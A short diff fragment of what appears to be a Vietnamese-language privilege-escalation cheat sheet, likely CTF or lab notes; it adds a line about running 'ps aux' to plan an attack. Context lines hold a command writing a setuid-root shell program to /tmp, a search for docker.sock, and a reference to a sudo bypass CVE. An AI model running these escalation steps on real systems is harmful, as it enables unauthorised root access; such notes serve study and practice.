@@ -52,3 +52,4 @@ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tm
 find / -name docker.sock 2>/dev/null
 CVE-2019-14287
 Hi vọng sẽ giúp ích cho bạn, NSF khó quá nên tui không ghi :V
+ps aux để xem các process chạy, để lập cách tấn công.
